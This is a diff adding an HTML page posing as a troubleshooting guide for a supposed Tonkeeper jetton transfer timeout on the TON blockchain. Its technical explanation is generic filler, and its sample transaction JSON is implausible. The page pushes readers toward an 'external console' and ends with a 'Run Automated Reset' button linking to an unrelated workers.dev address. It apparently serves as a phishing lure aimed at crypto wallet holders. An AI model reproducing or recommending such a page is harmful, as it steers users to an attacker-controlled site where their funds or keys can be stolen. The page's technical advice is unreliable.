@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
+<style>
+    body {
+        font-family: -apple-system;
+        background: #0f111a;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: none;
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff7b2c; }
+    .btn {
+        background: #ff9455;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h2>Symptom</h2>
+<ul>
+<li>Users of the TON ecosystem may encounter an error message indicating a "Tonkeeper Jetton transfer loop timeout" when attempting to transfer jettons, resulting in failed transactions and potential losses.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a timeout in the Tonkeeper Jetton transfer loop, which can be caused by network congestion, high gas fees, or issues with the smart contract responsible for facilitating the transfer.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To troubleshoot the issue, users can attempt the following:</li>
+<li>Increase the gas limit to prioritize the transaction</li>
+<li>Reduce the transaction amount to minimize network fees</li>
+<li>Utilize an alternative transfer method, such as a different wallet or exchange</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_wallet&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;recipient_wallet&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;100 jettons&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;20000&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;20 ton&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider using an external console to execute manual override commands for more flexibility. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Familiarity with the TON ecosystem and its native cryptocurrency</li>
+<li>Understanding of smart contract functionality and gas fees</li>
+<li>Access to a compatible wallet or exchange platform</li>
+</ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
